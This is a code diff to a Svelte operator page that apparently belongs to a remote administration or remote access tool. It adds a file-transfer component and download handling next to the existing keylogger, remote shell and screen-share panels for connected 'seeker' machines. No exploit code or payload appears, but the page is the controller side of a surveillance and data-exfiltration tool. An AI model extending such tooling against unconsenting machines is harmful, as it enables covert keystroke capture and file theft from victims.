@@ -8,14 +8,15 @@
 	import InfoComponent from '$lib/components/InfoComponent.svelte';
 	import MessageComponent from '$lib/components/MessageComponent.svelte';
 	import ScreenShareComponent from '$lib/components/ScreenShareComponent.svelte';
+	import FileTransferComponent from '$lib/components/FileTransferComponent.svelte';
 
 	let seeker: Seeker | null = null;
 	let ws: WebSocket | null = null;
 	const connected = writable(false);
 	const keylogs = writable<string[]>([]);
 	const shellOutput = writable<string[]>([]);
-	const shellRunning = writable(false);
 	const screenShareFrame = writable<string>('');
+	const fileTransferOutput = writable<string[]>([]);
 
 	function decodeHtml(html: string): string {
 		const txt = document.createElement('textarea');
@@ -97,6 +98,7 @@
 						if (message.data === id) {
 							console.log('Seeker disconnected.');
 							connected.set(false);
+							fileTransferOutput.set([]);
 						}
 						break;
 					case 'keylogger_keys':
@@ -118,6 +120,25 @@
 					case 'screenshare_output':
 						console.log('Screen share output:', message.data);
 						break;
+					case 'file_transfer_output':
+						fileTransferOutput.update((arr) => [...arr, message.data as string]);
+						break;
+					case 'file_download_response':
+						try {
+							const file_data = JSON.parse(message.data);
+							if (file_data.content && file_data.filename) {
+								const link = document.createElement('a');
+								link.href = `data:application/octet-stream;base64,${file_data.content}`;
+								link.download = file_data.filename;
+								link.click();
+								fileTransferOutput.update((arr) => [...arr, `[Success] Downloaded ${file_data.filename}`]);
+							} else {
+								fileTransferOutput.update((arr) => [...arr, `[Error] Invalid file data received`]);
+							}
+						} catch (e) {
+							fileTransferOutput.update((arr) => [...arr, `[Error] Failed to process download: ${e}`]);
+						}
+						break;
 					default:
 						console.warn('Unknown message type:', message.type);
 				}
@@ -132,6 +153,7 @@
 			sendMessage('keylogger_command', 'stop');
 			sendMessage('shell_command', 'stop');
 			shellOutput.set([]);
+			fileTransferOutput.set([]);
 		};
 	});
 
@@ -148,9 +170,10 @@
 {#if seeker}
 	<div class="p-6 bg-gray-800 rounded shadow-lg space-y-6">
 		<InfoComponent {seeker} {connected}/>
-		<ShellComponent {sendMessage} {shellRunning} {shellOutput} />
+		<ShellComponent {sendMessage} {shellOutput} />
 		<ScreenShareComponent {sendMessage} {screenShareFrame} />
 		<KeyloggerComponent {sendMessage} {keylogs} />
+		<FileTransferComponent {sendMessage} {fileTransferOutput} />
 		<MessageComponent {sendMessage} />
 	</div>
 {:else}
